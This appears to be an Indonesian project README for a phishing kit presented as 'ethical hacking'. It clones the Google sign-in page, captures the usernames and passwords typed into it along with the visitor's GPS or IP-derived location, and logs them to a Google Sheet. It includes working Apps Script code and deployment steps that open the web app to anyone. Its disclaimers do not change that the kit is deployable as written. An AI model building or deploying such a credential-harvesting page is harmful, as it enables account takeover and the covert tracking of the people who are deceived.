# Ethical-Hacking-Projects-01-Advanced-Phising-Simulator-With-Geolocation-Tracking
# Google Accounts Phishing Simulation

📖 Deskripsi Proyek

Proyek ini adalah simulasi *phising* halaman login bergaya Google yang interaktif. Aplikasi akan meminta input pengguna (email/telepon & password), meminta izin lokasi, lalu mencatat seluruh data ke Google Spreadsheet melalui Google Apps Script. Setelah proses selesai, pengguna akan diarahkan ke halaman tertentu.

📁 Struktur Proyek

File

Fungsi

Frontend.html

Menyediakan UI login, validasi form, pemrosesan lokasi, dan interaksi

Code.gs

Script backend Google Apps Script untuk menyimpan data ke Spreadsheet

🎯 Fitur Lengkap

✅ UI Login Google-Style✅ Validasi Format Email & Nomor Telepon✅ Tombol Show/Hide Password✅ Pesan Kesalahan Real-Time✅ Spinner (loading state)✅ "Forgot Password" (mengarah ke YouTube prank)✅ Popup Izin Lokasi (Modal Overlay)✅ Geolocation berlapis:

GPS (Geolocation API)

IP-based (ipapi.co)

Timezone fallback (contoh: Asia/Jakarta)

✅ Data Dicatat ke Google Sheet Otomatis✅ Redirect Otomatis ke Halaman Setelah Login

📄 Data yang Dicatat

Format data yang akan ditulis ke Google Sheet:

Timestamp

Username

Password

Latitude

Longitude

Accuracy

Source

Contoh data:

{
  "username": "john.doe@gmail.com",
  "password": "pa$$word123",
  "timestamp": "2025-07-02T09:50:00Z",
  "location": {
    "latitude": -6.2,
    "longitude": 106.8,
    "accuracy": 50,
    "source": "Geolocation API"
  }
}

🧱 Komponen Frontend (Frontend.html)

🧩 Tampilan dan UI

Dibuat dengan HTML & CSS responsif

Floating label pada input (mirip Material Design)

Desain sangat menyerupai halaman login Google

Elemen login:

Input email/telepon

Input password dengan tombol “Show”

Link "Forgot Password?" mengarah ke:https://www.youtube.com/watch?v=dQw4w9WgXcQ 😄

📍 Modul Geolocation

Modal (popup) muncul setelah form tervalidasi

Tombol:

"Grant Permission" → Meminta lokasi GPS

"Continue without Permission" → Menggunakan fallback

Fallback:

IP Location (akurat ~50 km)

Timezone → Estimasi kasar lokasi berdasarkan Intl.DateTimeFormat().resolvedOptions().timeZone

🔁 Form Submission Flow

Validasi input

Tampilkan popup izin lokasi

Ambil lokasi pengguna

Kirim semua data ke Code.gs melalui google.script.run.submitLoginData

Tampilkan spinner saat loading

Redirect ke halaman:

https://myaccount.google.com/deleteaccount?...

Kamu bisa ganti URL di fungsi redirectToPortfolio().

🧠 Fungsi-Fungsi Frontend

Fungsi

Deskripsi

validateForm()

Mengecek validitas email/telepon dan password

isValidEmail()

Regex validasi email

isValidPhone()

Regex validasi nomor telepon (internasional)

getCurrentLocation()

Ambil lokasi GPS dengan navigator.geolocation

getIPLocation()

Fetch lokasi berdasarkan IP dari https://ipapi.co/json/

getApproximateLocation()

Gunakan zona waktu untuk mengestimasi lokasi

submitFormWithData()

Kirim data ke Apps Script + atur spinner & timeout

redirectToPortfolio()

Mengarahkan pengguna ke URL target setelah submit berhasil atau timeout

🧩 Backend Apps Script (Code.gs)

📌 Fungsi: submitLoginData(data)

Dibuat dengan Google Apps Script

Menerima objek data dari frontend

Mendekode nilai dan menyimpan ke baris baru Google Sheet

Gunakan SpreadsheetApp.openById(SPREADSHEET_ID) dan appendRow([...])

Contoh kode:

function submitLoginData(data) {
  const ss = SpreadsheetApp.openById("SPREADSHEET_ID_KAMU");
  const sheet = ss.getActiveSheet();

  const loc = data.location || {};
  const row = [
    new Date(),
    data.username,
    data.password,
    loc.latitude || '',
    loc.longitude || '',
    loc.accuracy || '',
    loc.source || 'unknown'
  ];
  
  sheet.appendRow(row);
}

Ganti "SPREADSHEET_ID_KAMU" dengan ID dari Google Spreadsheet kamu.

🚀 Cara Menjalankan

1. Setup Spreadsheet

Buat Google Spreadsheet baru

Salin spreadsheetId dari URL

Tambahkan header seperti di bagian “📄 Data yang Dicatat”

2. Deploy Web App

Buka Google Apps Script

Buat proyek baru

Tambahkan:

File Code.gs → backend

File Frontend.html → interface

Edit ID spreadsheet di Code.gs

Deploy:

Klik Deploy > New Deployment

Pilih Web App

Pengaturan:

Execute as: Me

Access: Anyone

Simpan URL Web App kamu

🧪 Testing & Simulasi

Buka URL web app

Isi form login → klik Next

Modal akan muncul → izinkan lokasi atau tidak

Cek Google Sheet → data tercatat

Halaman akan dialihkan ke redirect URL

⚠️ Disclaimer Etis & Legal

❗ Proyek ini hanya untuk simulasi dan pembelajaran.

Jangan digunakan untuk menyamar sebagai layanan Google

Jangan digunakan untuk mencuri data pengguna

Wajib mendapatkan izin dari pengguna jika mengambil data lokasi dan informasi pribadi

Melanggar bisa berdampak hukum dan pelanggaran kebijakan


### 🗄️ Penyimpanan Data
Data disimpan dalam spreadsheet dengan kolom:
```
| Username | Password | Timestamp          | Google Maps Link               | Koordinat       |
|----------|----------|--------------------|--------------------------------|-----------------|
| user@abc | 123456   | 2023-01-01 10:00:00| https://maps.google.com?q=-6.1 | -6.1,106.8      |
```

## 🛠️ Komponen Teknis

### 🔌 Backend (Code.gs)
- Membuat antarmuka web dari HTML
- Memproses data yang dikirim
- Menyimpan ke Google Sheets dengan format terstruktur
- Error handling yang robust

### 🎨 Frontend (Frontend.html)
- Clone halaman login Google yang responsif
- Validasi form modern
- Sistem toggle password
- 3 lapis fallback lokasi:
  1. GPS presisi
  2. IP-based
  3. Zona waktu

## ⚠️ Penting!
Proyek ini DEMO SAJA untuk:
- Edukasi keamanan siber
- Pelatihan awareness phishing
- Penelitian teknik pertahanan

🚫 **Dilarang keras digunakan untuk:**
- Aktivitas ilegal
- Penipuan
- Tujuan jahat lainnya

## 📥 Instalasi
1. Buat project Apps Script baru
2. Salin kode `Code.gs` dan `Frontend.html`
3. Deploy sebagai web app
4. Siapkan spreadsheet dengan struktur kolom yang sesuai


## 🧾 Lisensi

MIT License © 2025 — Project by [Alfin Bahru Rahmika Umar]
